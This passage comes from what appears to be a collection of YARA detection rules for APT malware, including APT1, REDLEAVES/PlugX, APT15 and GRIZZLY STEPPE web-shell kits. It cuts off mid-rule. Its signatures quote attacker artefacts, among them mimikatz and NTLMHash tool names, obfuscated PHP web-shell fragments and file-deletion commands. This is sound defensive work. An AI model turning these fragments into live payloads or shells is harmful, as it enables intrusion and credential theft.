  "APT1_TARSIP_MOON": "rule APT1_TARSIP_MOON\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"\\\\XiaoME\\\\SunCloud-Code\\\\moon\" wide ascii\n        $s2 = \"URL download success!\" wide ascii\n        $s3 = \"Kugoosoft\" wide ascii\n        $msg1 = \"Modify file failed!! So strange!\" wide ascii\n        $msg2 = \"Create cmd process failed!\" wide ascii\n        $msg3 = \"The command has not been implemented!\" wide ascii\n        $msg4 = \"Runas success!\" wide ascii\n        $onec1 = \"onec.php\" wide ascii\n        $onec2 = \"/bin/onec\" wide ascii\n\n    condition:\n        1 of ($s*) and 1 of ($msg*) and 1 of ($onec*)\n}",
  "APT1_payloads": "rule APT1_payloads\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n\n    strings:\n        $pay1 = \"rusinfo.exe\" wide ascii\n        $pay2 = \"cmd.exe\" wide ascii\n        $pay3 = \"AdobeUpdater.exe\" wide ascii\n        $pay4 = \"buildout.exe\" wide ascii\n        $pay5 = \"DefWatch.exe\" wide ascii\n        $pay6 = \"d.exe\" wide ascii\n        $pay7 = \"em.exe\" wide ascii\n        $pay8 = \"IMSCMig.exe\" wide ascii\n        $pay9 = \"localfile.exe\" wide ascii\n        $pay10 = \"md.exe\" wide ascii\n        $pay11 = \"mdm.exe\" wide ascii\n        $pay12 = \"mimikatz.exe\" wide ascii\n        $pay13 = \"msdev.exe\" wide ascii\n        $pay14 = \"ntoskrnl.exe\" wide ascii\n        $pay15 = \"p.exe\" wide ascii\n        $pay16 = \"otepad.exe\" wide ascii\n        $pay17 = \"reg.exe\" wide ascii\n        $pay18 = \"regsvr.exe\" wide ascii\n        $pay19 = \"runinfo.exe\" wide ascii\n        $pay20 = \"AdobeUpdate.exe\" wide ascii\n        $pay21 = \"inetinfo.exe\" wide ascii\n        $pay22 = \"svehost.exe\" wide ascii\n        $pay23 = \"update.exe\" wide ascii\n        $pay24 = \"NTLMHash.exe\" wide ascii\n        $pay25 = \"wpnpinst.exe\" wide ascii\n        $pay26 = \"WSDbg.exe\" wide ascii\n        $pay27 = \"xcmd.exe\" wide ascii\n        $pay28 = \"adobeup.exe\" wide ascii\n        $pay29 = \"0830.bin\" wide ascii\n        $pay30 = \"1001.bin\" wide ascii\n        $pay31 = \"a.bin\" wide ascii\n        $pay32 = \"ISUN32.EXE\" wide ascii\n        $pay33 = \"AcroRD32.EXE\" wide ascii\n        $pay34 = \"INETINFO.EXE\" wide ascii\n\n    condition:\n        1 of them\n}",
  "APT1_RARSilent_EXE_PDF": "rule APT1_RARSilent_EXE_PDF\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $winrar1 = \"WINRAR.SFX\" wide ascii\n        $str2 = \"Steup=\" wide ascii\n\n    condition:\n        all of them\n}",
  "APT1_aspnetreport": "rule APT1_aspnetreport\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $url = \"aspnet_client/report.asp\" wide ascii\n        $param = \"name=%s&Gender=%c&Random=%04d&SessionKey=%s\" wide ascii\n        $pay1 = \"rusinfo.exe\" wide ascii\n        $pay2 = \"cmd.exe\" wide ascii\n        $pay3 = \"AdobeUpdater.exe\" wide ascii\n        $pay4 = \"buildout.exe\" wide ascii\n        $pay5 = \"DefWatch.exe\" wide ascii\n        $pay6 = \"d.exe\" wide ascii\n        $pay7 = \"em.exe\" wide ascii\n        $pay8 = \"IMSCMig.exe\" wide ascii\n        $pay9 = \"localfile.exe\" wide ascii\n        $pay10 = \"md.exe\" wide ascii\n        $pay11 = \"mdm.exe\" wide ascii\n        $pay12 = \"mimikatz.exe\" wide ascii\n        $pay13 = \"msdev.exe\" wide ascii\n        $pay14 = \"ntoskrnl.exe\" wide ascii\n        $pay15 = \"p.exe\" wide ascii\n        $pay16 = \"otepad.exe\" wide ascii\n        $pay17 = \"reg.exe\" wide ascii\n        $pay18 = \"regsvr.exe\" wide ascii\n        $pay19 = \"runinfo.exe\" wide ascii\n        $pay20 = \"AdobeUpdate.exe\" wide ascii\n        $pay21 = \"inetinfo.exe\" wide ascii\n        $pay22 = \"svehost.exe\" wide ascii\n        $pay23 = \"update.exe\" wide ascii\n        $pay24 = \"NTLMHash.exe\" wide ascii\n        $pay25 = \"wpnpinst.exe\" wide ascii\n        $pay26 = \"WSDbg.exe\" wide ascii\n        $pay27 = \"xcmd.exe\" wide ascii\n        $pay28 = \"adobeup.exe\" wide ascii\n        $pay29 = \"0830.bin\" wide ascii\n        $pay30 = \"1001.bin\" wide ascii\n        $pay31 = \"a.bin\" wide ascii\n        $pay32 = \"ISUN32.EXE\" wide ascii\n        $pay33 = \"AcroRD32.EXE\" wide ascii\n        $pay34 = \"INETINFO.EXE\" wide ascii\n\n    condition:\n        $url and $param and 1 of ($pay*)\n}",
  "APT1_Revird_svc": "rule APT1_Revird_svc\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $dll1 = \"nwwwks.dll\" wide ascii\n        $dll2 = \"rdisk.dll\" wide ascii\n        $dll3 = \"skeys.dll\" wide ascii\n        $dll4 = \"SvcHost.DLL.log\" wide ascii\n        $svc1 = \"InstallService\" wide ascii\n        $svc2 = \"RundllInstallA\" wide ascii\n        $svc3 = \"RundllUninstallA\" wide ascii\n        $svc4 = \"ServiceMain\" wide ascii\n        $svc5 = \"UninstallService\" wide ascii\n\n    condition:\n        1 of ($dll*) and 2 of ($svc*)\n}",
  "APT1_dbg_mess": "rule APT1_dbg_mess\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $dbg1 = \"Down file ok!\" wide ascii\n        $dbg2 = \"Send file ok!\" wide ascii\n        $dbg3 = \"Command Error!\" wide ascii\n        $dbg4 = \"Pls choose target first!\" wide ascii\n        $dbg5 = \"Alert!\" wide ascii\n        $dbg6 = \"Pls press enter to make sure!\" wide ascii\n        $dbg7 = \"Are you sure to \" wide ascii\n        $pay1 = \"rusinfo.exe\" wide ascii\n        $pay2 = \"cmd.exe\" wide ascii\n        $pay3 = \"AdobeUpdater.exe\" wide ascii\n        $pay4 = \"buildout.exe\" wide ascii\n        $pay5 = \"DefWatch.exe\" wide ascii\n        $pay6 = \"d.exe\" wide ascii\n        $pay7 = \"em.exe\" wide ascii\n        $pay8 = \"IMSCMig.exe\" wide ascii\n        $pay9 = \"localfile.exe\" wide ascii\n        $pay10 = \"md.exe\" wide ascii\n        $pay11 = \"mdm.exe\" wide ascii\n        $pay12 = \"mimikatz.exe\" wide ascii\n        $pay13 = \"msdev.exe\" wide ascii\n        $pay14 = \"ntoskrnl.exe\" wide ascii\n        $pay15 = \"p.exe\" wide ascii\n        $pay16 = \"otepad.exe\" wide ascii\n        $pay17 = \"reg.exe\" wide ascii\n        $pay18 = \"regsvr.exe\" wide ascii\n        $pay19 = \"runinfo.exe\" wide ascii\n        $pay20 = \"AdobeUpdate.exe\" wide ascii\n        $pay21 = \"inetinfo.exe\" wide ascii\n        $pay22 = \"svehost.exe\" wide ascii\n        $pay23 = \"update.exe\" wide ascii\n        $pay24 = \"NTLMHash.exe\" wide ascii\n        $pay25 = \"wpnpinst.exe\" wide ascii\n        $pay26 = \"WSDbg.exe\" wide ascii\n        $pay27 = \"xcmd.exe\" wide ascii\n        $pay28 = \"adobeup.exe\" wide ascii\n        $pay29 = \"0830.bin\" wide ascii\n        $pay30 = \"1001.bin\" wide ascii\n        $pay31 = \"a.bin\" wide ascii\n        $pay32 = \"ISUN32.EXE\" wide ascii\n        $pay33 = \"AcroRD32.EXE\" wide ascii\n        $pay34 = \"INETINFO.EXE\" wide ascii\n\n    condition:\n        4 of ($dbg*) and 1 of ($pay*)\n}",
  "APT1_known_malicious_RARSilent": "rule APT1_known_malicious_RARSilent\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n\n    strings:\n        $str1 = \"Analysis And Outlook.doc\" wide ascii\n        $str2 = \"North Korean launch.pdf\" wide ascii\n        $str3 = \"Dollar General.doc\" wide ascii\n        $str4 = \"Dow Corning Corp.pdf\" wide ascii\n\n    condition:\n        1 of them and APT1_RARSilent_EXE_PDF\n}",
  "Dropper_DeploysMalwareViaSideLoading": "rule Dropper_DeploysMalwareViaSideLoading {\nmeta:\n        description = \"Detect a dropper used to deploy an implant via side loading. This dropper has specifically been observed deploying REDLEAVES & PlugX\"\n        author = \"USG\"\n        true_positive = \"5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481: drops REDLEAVES. 6392e0701a77ea25354b1f40f5b867a35c0142abde785a66b83c9c8d2c14c0c3: drops plugx. \"\n        reference = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n\nstrings:\n        $UniqueString = {2e 6c 6e 6b [0-14] 61 76 70 75 69 2e 65 78 65} // \".lnk\" near \"avpui.exe\"\n        $PsuedoRandomStringGenerator = {b9 1a [0-6] f7 f9 46 80 c2 41 88 54 35 8b 83 fe 64} // Unique function that generates a 100 character pseudo random string.\n\ncondition:\n        any of them\n}",
  "REDLEAVES_DroppedFile_ImplantLoader_Starburn": "rule REDLEAVES_DroppedFile_ImplantLoader_Starburn {\nmeta:\n        description = \"Detect the DLL responsible for loading and deobfuscating the DAT file containing shellcode and core REDLEAVES RAT\"\n        author = \"USG\"\n        true_positive = \"7f8a867a8302fe58039a6db254d335ae\" // StarBurn.dll\n        reference = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\nstrings:\n        $XOR_Loop = {32 0c 3a 83 c2 02 88 0e 83 fa 08 [4-14] 32 0c 3a 83 c2 02 88 0e 83 fa 10} // Deobfuscation loop\ncondition:\n        any of them\n}",
  "REDLEAVES_DroppedFile_ObfuscatedShellcodeAndRAT_handkerchief": "rule REDLEAVES_DroppedFile_ObfuscatedShellcodeAndRAT_handkerchief {\nmeta:\n        description = \"Detect obfuscated .dat file containing shellcode and core REDLEAVES RAT\"\n        author = \"USG\"\n        true_positive = \"fb0c714cd2ebdcc6f33817abe7813c36\" // handkerchief.dat\n        reference = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n\nstrings:\n        $RedleavesStringObfu = {73 64 65 5e 60 74 75 74 6c 6f 60 6d 5e 6d 64 60 77 64 72 5e 65 6d 6d 6c 60 68 6f 2f 65 6d 6d} // This is 'red_autumnal_leaves_dllmain.dll' XOR'd with 0x01\ncondition:\n        any of them\n}",
  "REDLEAVES_CoreImplant_UniqueStrings": "rule REDLEAVES_CoreImplant_UniqueStrings {\nmeta:\n        description = \"Strings identifying the core REDLEAVES RAT in its deobfuscated state\"\n        author = \"USG\"\n        reference = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n\nstrings:\n        $unique2 = \"RedLeavesSCMDSimulatorMutex\" nocase wide ascii\n        $unique4 = \"red_autumnal_leaves_dllmain.dll\" wide ascii\n        $unique7 = \"\\\\NamePipe_MoreWindows\" wide ascii\ncondition:\n        any of them\n}",
  "PLUGX_RedLeaves": "rule PLUGX_RedLeaves\n{\nmeta:\n        author = \"US-CERT Code Analysis Team\"\n        date = \"03042017\"\n        incident = \"10118538\"\n        date = \"2017/04/03\"\n        MD5_1 = \"598FF82EA4FB52717ACAFB227C83D474\"\n        MD5_2 = \"7D10708A518B26CC8C3CBFBAA224E032\"\n        MD5_3 = \"AF406D35C77B1E0DF17F839E36BCE630\"\n        MD5_4 = \"6EB9E889B091A5647F6095DCD4DE7C83\"\n        MD5_5 = \"566291B277534B63EAFC938CDAAB8A399E41AF7D\"\n        info = \"Detects specific RedLeaves and PlugX binaries\"\n        reference = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n\nstrings:\n        $s0 = { 80343057403D2FD0010072F433C08BFF80343024403D2FD0010072F4 }\n        $s1 = \"C:/Users/user/Desktop/my_OK_2014/bit9/runsna/Release/runsna.pdb\" fullword ascii\n        $s2 = \"d:/work/plug4.0(shellcode)\" fullword ascii\n        $s3 = \"/shellcode/shellcode/XSetting.h\" fullword ascii\n        $s4 = { 42AFF4276A45AA58474D4C4BE03D5B395566BEBCBDEDE9972872C5C4C5498228 }\n        $s5 = { 8AD32AD002D180C23830140E413BCB7CEF6A006A006A00566A006A00 }\n        $s6 = { EB055F8BC7EB05E8F6FFFFFF558BEC81ECC8040000535657 }\n        $s7 = { 8A043233C932043983C10288043283F90A7CF242890D18AA00103BD37CE2891514AA00106A006A006A0056 }\n        $s8 = { 293537675A402A333557B05E04D09CB05EB3ADA4A4A40ED0B7DAB7935F5B5B08 }\n        $s9 = \"RedLeavesCMDSimulatorMutex\"\ncondition:\n        $s0 or $s1 or $s2 and $s3 or $s4 or $s5 or $s6 or $s7 or $s8 or $s9\n}",
  "Ham_backdoor": "rule Ham_backdoor\n{\nmeta:\n        author = \"Cylance Spear Team\"\n        reference = \"https://www.cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html\"\nstrings:\n        $a = {8D 14 3E 8B 7D FC 8A 0C 11 32 0C 38 40 8B 7D 10 88 0A 8B 4D 08 3B C3}\n        $b = {8D 0C 1F 8B 5D F8 8A 04 08 32 04 1E 46 8B 5D 10 88 01 8B 45 08 3B F2}\ncondition:\n        $a or $b\n}",
  "Tofu_Backdoor": "rule Tofu_Backdoor\n{\nmeta:\n        author = \"Cylance Spear Team\"\n        reference = \"https://www.cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html\"\nstrings:\n\t$a = \"Cookies: Sym1.0\"\n\t$b = \"\\\\\\\\.\\\\pipe\\\\1[12345678]\"\n\t$c = {66 0F FC C1 0F 11 40 D0 0F 10 40 D0 66 0F EF C2 0F 11 40 D0 0F 10 40 E0}\ncondition:\n\t$a or $b or $c\n}",
  "clean_apt15_patchedcmd": "rule clean_apt15_patchedcmd{\n\tmeta:\n\t\tauthor = \"Ahmed Zaki\"\n\t\tdescription = \"This is a patched CMD. This is the CMD that RoyalCli uses.\"\n\t\treference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\t\tsha256 = \"90d1f65cfa51da07e040e066d4409dc8a48c1ab451542c894a623bc75c14bf8f\"\n\tstrings:\n\t    $ = \"eisableCMD\" wide\n\t    $ = \"%WINDOWS_COPYRIGHT%\" wide\n\t    $ = \"Cmd.Exe\" wide\n\t    $ = \"Windows Command Processor\" wide\n\tcondition:\n        \tall of them\n}",
  "malware_apt15_royalcli_1": "rule malware_apt15_royalcli_1{\n\tmeta:\n    description = \"Generic strings found in the Royal CLI tool\"\n    reference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\t\tauthor = \"David Cannings\"\n\t\tsha256 = \"6df9b712ff56009810c4000a0ad47e41b7a6183b69416251e060b5c80cd05785\"\n\n\tstrings:\n\t    $ = \"%s~clitemp%08x.tmp\" fullword\n\t    $ = \"qg.tmp\" fullword\n\t    $ = \"%s /c %s>%s\" fullword\n\t    $ = \"hkcmd.exe\" fullword\n\t    $ = \"%snewcmd.exe\" fullword\n\t    $ = \"%shkcmd.exe\" fullword\n\t    $ = \"%s~clitemp%08x.ini\" fullword\n\t    $ = \"myRObject\" fullword\n\t    $ = \"myWObject\" fullword\n\t    $ = \"10 %d %x\\x0D\\x0A\"\n\t    $ = \"4 %s  %d\\x0D\\x0A\"\n\t    $ = \"6 %s  %d\\x0D\\x0A\"\n\t    $ = \"1 %s  %d\\x0D\\x0A\"\n\t    $ = \"3 %s  %d\\x0D\\x0A\"\n\t    $ = \"5 %s  %d\\x0D\\x0A\"\n\t    $ = \"2 %s  %d 0 %d\\x0D\\x0A\"\n\t    $ = \"2 %s  %d 1 %d\\x0D\\x0A\"\n\t    $ = \"%s file not exist\" fullword\n\n\tcondition:\n\t    5 of them\n}",
  "malware_apt15_royalcli_2": "rule malware_apt15_royalcli_2{\n\tmeta:\n    author = \"Nikolaos Pantazopoulos\"\n    description = \"APT15 RoyalCli backdoor\"\n    reference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\tstrings:\n\t\t$string1 = \"%shkcmd.exe\" fullword\n\t\t$string2 = \"myRObject\" fullword\n\t\t$string3 = \"%snewcmd.exe\" fullword\n\t\t$string4 = \"%s~clitemp%08x.tmp\" fullword\n\t\t$string5 = \"hkcmd.exe\" fullword\n\t\t$string6 = \"myWObject\" fullword\n\tcondition:\n\t\tuint16(0) == 0x5A4D and 2 of them\n}",
  "malware_apt15_bs2005": "rule malware_apt15_bs2005{\n\tmeta:\n\t\tauthor\t=\t\"Ahmed Zaki\"\n\t\tmd5\t=\t\"ed21ce2beee56f0a0b1c5a62a80c128b\"\n\t\tdescription\t=\t\"APT15 bs2005\"\n\t\treference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n   \tstrings:\n\t\t$ = \"%s&%s&%s&%s\"  wide ascii\n\t\t$ = \"%s\\\\%s\"  wide ascii\n\t\t$ = \"WarOnPostRedirect\"  wide ascii fullword\n\t\t$ = \"WarnonZoneCrossing\"  wide ascii fullword\n\t\t$ = \"^^^^^\" wide ascii fullword\n\t\t\t/*\n\t\t\t\t\"%s\" /C \"%s > \"%s\\tmp.txt\" 2>&1 \"     \n\t\t\t*/\n\t\t$ =  /\"?%s\\s*\"?\\s*\\/C\\s*\"?%s\\s*>\\s*\\\\?\"?%s\\\\(\\w+\\.\\w+)?\"\\s*2>&1\\s*\"?/ \n\t\t$ =\"IEharden\" wide ascii fullword\n\t\t$ =\"DEPOff\" wide ascii fullword\n\t\t$ =\"ShownVerifyBalloon\" wide ascii fullword\n\t\t$ =\"IEHardenIENoWarn\" wide ascii fullword\n   \tcondition:\n\t\t(uint16(0) == 0x5A4D and 5 of them) or \n\t\t( uint16(0) == 0x5A4D and 3 of them and \n\t\t( pe.imports(\"advapi32.dll\", \"CryptDecrypt\") and pe.imports(\"advapi32.dll\", \"CryptEncrypt\") and\n\t\tpe.imports(\"ole32.dll\", \"CoCreateInstance\")))}",
  "malware_apt15_royaldll": "rule malware_apt15_royaldll{\n\tmeta:\n\t\tauthor = \"David Cannings\"\n\t\tdescription = \"DLL implant, originally rights.dll and runs as a service\"\n\t\treference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\t\tsha256 = \"bc937f6e958b339f6925023bc2af375d669084e9551fd3753e501ef26e36b39d\"          \n\tstrings:\n\t    /*\n\t      56                push    esi\n\t      B8 A7 C6 67 4E    mov     eax, 4E67C6A7h\n\t      83 C1 02          add     ecx, 2\n\t      BA 04 00 00 00    mov     edx, 4\n\t      57                push    edi\n\t      90                nop\n\t    */\n\t    // JSHash implementation (Justin Sobel's hash algorithm)\n\t\t$opcodes_jshash = { B8 A7 C6 67 4E 83 C1 02 BA 04 00 00 00 57 90 }\n\n\t    /*\n\t      0F B6 1C 03       movzx   ebx, byte ptr [ebx+eax]\n\t      8B 55 08          mov     edx, [ebp+arg_0]\n\t      30 1C 17          xor     [edi+edx], bl\n\t      47                inc     edi\n\t      3B 7D 0C          cmp     edi, [ebp+arg_4]\n\t      72 A4             jb      short loc_10003F31\n\t    */\n\t    // Encode loop, used to \"encrypt\" data before DNS request\n\t\t$opcodes_encode = { 0F B6 1C 03 8B 55 08 30 1C 17 47 3B 7D 0C }\n\n\t    /*\n\t      68 88 13 00 00    push    5000 # Also seen 3000, included below\n\t      FF D6             call    esi ; Sleep\n\t      4F                dec     edi\n\t      75 F6             jnz     short loc_10001554\n\t    */\n\t    // Sleep loop\n\t\t$opcodes_sleep_loop = { 68 (88|B8) (13|0B) 00 00 FF D6 4F 75 F6 }\n\n\t    // Generic strings\n\t    $ = \"Nwsapagent\" fullword\n\t    $ = \"\\\"%s\\\">>\\\"%s\\\"\\\\s.txt\"\n\t    $ = \"myWObject\" fullword\n\t    $ = \"del c:\\\\windows\\\\temp\\\\r.exe /f /q\"\n\t    $ = \"del c:\\\\windows\\\\temp\\\\r.ini /f /q\"\n\tcondition:\n\t\t3 of them\n}",
  "malware_apt15_royaldll_2": "rule malware_apt15_royaldll_2\t{\n\tmeta:\n\t\tauthor\t=\t\"Ahmed Zaki\"\n\t\tsha256\t=\t\"bc937f6e958b339f6925023bc2af375d669084e9551fd3753e501ef26e36b39d\"\n\t\tdescription\t=\t\"DNS backdoor used by APT15\"\n\t\treference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\tstrings:\n\t\t    $= \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost\" wide ascii \n\t\t    $= \"netsvcs\" wide ascii fullword\n\t\t    $= \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\" wide ascii fullword\n\t\t    $= \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" wide ascii\n\t\t    $= \"myWObject\" wide ascii \n\tcondition:\n\t\tuint16(0) == 0x5A4D and all of them\n\t\tand pe.exports(\"ServiceMain\")\n\t\tand filesize > 50KB and filesize < 600KB\n}",
  "malware_apt15_exchange_tool": "rule malware_apt15_exchange_tool {\n\tmeta:\n\t\tauthor = \"Ahmed Zaki\"\n\t\tmd5 = \"d21a7e349e796064ce10f2f6ede31c71\"\n\t\tdescription = \"This is a an exchange enumeration/hijacking tool used by an APT 15\"\n\t\treference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\tstrings:\n\t\t$s1= \"subjectname\" fullword\n\t\t$s2= \"sendername\" fullword\n\t\t$s3= \"WebCredentials\" fullword\n\t\t$s4= \"ExchangeVersion\"\tfullword\n\t\t$s5= \"ExchangeCredentials\"\tfullword\n\t\t$s6= \"slfilename\"\tfullword\n\t\t$s7= \"EnumMail\"\tfullword\n\t\t$s8= \"EnumFolder\"\tfullword\n\t\t$s9= \"set_Credentials\"\tfullword\n\t\t$s10 = \"/de\" wide\n\t\t$s11 = \"/sn\" wide\n\t\t$s12 = \"/sbn\" wide\n\t\t$s13 = \"/list\" wide\n\t\t$s14 = \"/enum\" wide\n\t\t$s15 = \"/save\" wide\n\t\t$s16 = \"/ao\" wide\n\t\t$s17 = \"/sl\" wide\n\t\t$s18 = \"/v or /t is null\" wide\n\t\t$s19 = \"2007\" wide\n\t\t$s20 = \"2010\" wide\n\t\t$s21 = \"2010sp1\" wide\n\t\t$s22 = \"2010sp2\" wide\n\t\t$s23 = \"2013\" wide\n\t\t$s24 = \"2013sp1\" wide\n\tcondition:\n\t\tuint16(0) == 0x5A4D and 15 of ($s*)\n}",
  "malware_apt15_generic": "rule malware_apt15_generic {\n\tmeta:\n\t\tauthor = \"David Cannings\"\n\t\tdescription = \"Find generic data potentially relating to AP15 tools\"\n\t\treference = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n\tstrings:\n\t    // Appears to be from copy/paste code\n\t\t$str01 = \"myWObject\" fullword\n\t\t$str02 = \"myRObject\" fullword\n\n\t    /*\n\t      6A 02             push    2               ; dwCreationDisposition\n\t      6A 00             push    0               ; lpSecurityAttributes\n\t      6A 00             push    0               ; dwShareMode\n\t      68 00 00 00 C0    push    0C0000000h      ; dwDesiredAccess\n\t      50                push    eax             ; lpFileName\n\t      FF 15 44 F0 00 10 call    ds:CreateFileA\n\t    */\n\t    // Arguments for CreateFileA\n\t\t$opcodes01 = { 6A (02|03) 6A 00 6A 00 68 00 00 00 C0 50 FF 15 }\n  \tcondition:\n\t\t2 of them\n}",
  "APT17_Sample_FXSST_DLL": "rule APT17_Sample_FXSST_DLL \n{\n    \n    meta:\n        description = \"Detects Samples related to APT17 activity - file FXSST.DLL\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/ZiJyQv\"\n        date = \"2015-05-14\"\n        hash = \"52f1add5ad28dc30f68afda5d41b354533d8bce3\"\n        \n    strings:\n        $x1 = \"Microsoft? Windows? Operating System\" fullword wide\n        $x2 = \"fxsst.dll\" fullword ascii\n        $y1 = \"DllRegisterServer\" fullword ascii\n        $y2 = \".cSV\" fullword ascii\n        $s1 = \"GetLastActivePopup\"\n        $s2 = \"Sleep\"\n        $s3 = \"GetModuleFileName\"\n        $s4 = \"VirtualProtect\"\n        $s5 = \"HeapAlloc\"\n        $s6 = \"GetProcessHeap\"\n        $s7 = \"GetCommandLine\"\n   \n   condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and ( 1 of ($x*) or all of ($y*) ) and all of ($s*)\n}",
  "GRIZZLY_STEPPE_Malware_1": "rule GRIZZLY_STEPPE_Malware_1\n{\n\n   meta:\n      description = \"Auto-generated rule - file HRDG022184_certclint.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/WVflzO\"\n      date = \"2016-12-29\"\n      hash1 = \"9f918fb741e951a10e68ce6874b839aef5a26d60486db31e509f8dcaa13acec5\"\n\n   strings:\n      $s1 = \"S:\\\\Lidstone\\\\renewing\\\\HA\\\\disable\\\\In.pdb\" fullword ascii\n      $s2 = \"Repeat last find command)Replace specific text with different text\" fullword wide\n      $s3 = \"l\\\\Processor(0)\\\\% Processor Time\" fullword wide\n      $s6 = \"Self Process\" fullword wide\n      $s7 = \"Default Process\" fullword wide\n      $s8 = \"Star Polk.exe\" fullword wide\n\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 4 of them )\n}",
  "GRIZZLY_STEPPE_Malware_2": "rule GRIZZLY_STEPPE_Malware_2\n{\n\n   meta:\n      description = \"Auto-generated rule - file 9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/WVflzO\"\n      date = \"2016-12-29\"\n      hash1 = \"9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0\"\n      hash2 = \"55058d3427ce932d8efcbe54dccf97c9a8d1e85c767814e34f4b2b6a6b305641\"\n      \n   strings:\n      $x1 = \"GoogleCrashReport.dll\" fullword ascii\n      $s1 = \"CrashErrors\" fullword ascii\n      $s2 = \"CrashSend\" fullword ascii\n      $s3 = \"CrashAddData\" fullword ascii\n      $s4 = \"CrashCleanup\" fullword ascii\n      $s5 = \"CrashInit\" fullword ascii\n\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and $x1 ) or ( all of them )\n}",
  "PAS_TOOL_PHP_WEB_KIT_mod": "rule PAS_TOOL_PHP_WEB_KIT_mod \n{\n   \n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      reference = \"https://www.us-cert.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity\"\n      author = \"US CERT - modified by Florian Roth due to performance reasons\"\n      date = \"2016/12/29\"\n   \n   strings:\n      $php = \"<?php\"\n      $base64decode1 = \"='base'.(\"\n      $strreplace = \"str_replace(\\\"\\\\n\\\", ''\"\n      $md5 = \".substr(md5(strrev(\"\n      $gzinflate = \"gzinflate\"\n      $cookie = \"_COOKIE\"\n      $isset = \"isset\"\n   \n   condition:\n      $php at 0 and (filesize > 10KB and filesize < 30KB) and #cookie == 2 and #isset == 3 and all of them\n}",
  "WebShell_PHP_Web_Kit_v3": "rule WebShell_PHP_Web_Kit_v3\n{\n\n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      reference = \"https://github.com/wordfence/grizzly\"\n      author = \"Florian Roth\"\n      date = \"2016/01/01\"\n\n   strings:\n      $php = \"<?php $\"\n      $php2 = \"@assert(base64_decode($_REQUEST[\"\n      $s1 = \"(str_replace(\\\"\\\\n\\\", '', '\"\n      $s2 = \"(strrev($\" ascii\n      $s3 = \"de'.'code';\" ascii\n\n   condition:\n      ( $php at 0 or $php2 ) and filesize > 8KB and filesize < 100KB and all of ($s*)\n}",
  "WebShell_PHP_Web_Kit_v4": "rule WebShell_PHP_Web_Kit_v4\n{\n\n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      reference = \"https://github.com/wordfence/grizzly\"\n      author = \"Florian Roth\"\n      date = \"2016/01/01\"\n\n   strings:\n      $php = \"<?php $\"\n      $s1 = \"(StR_ReplAcE(\\\"\\\\n\\\",'',\"\n      $s2 = \";if(PHP_VERSION<'5'){\" ascii\n      $s3 = \"=SuBstr_rePlACe(\" ascii\n\n   condition:\n      $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ($s*)\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule APT3102Code\n{\n\n    meta:\n        description = \"3102 code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n\n    strings:\n        $setupthread = { B9 02 07 00 00 BE ?? ?? ?? ?? 8B F8 6A 00 F3 A5 }\n\n    condition:\n        any of them\n}\n\nrule APT3102Strings\n{\n    \n    meta:\n        description = \"3102 Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n\n    strings:\n        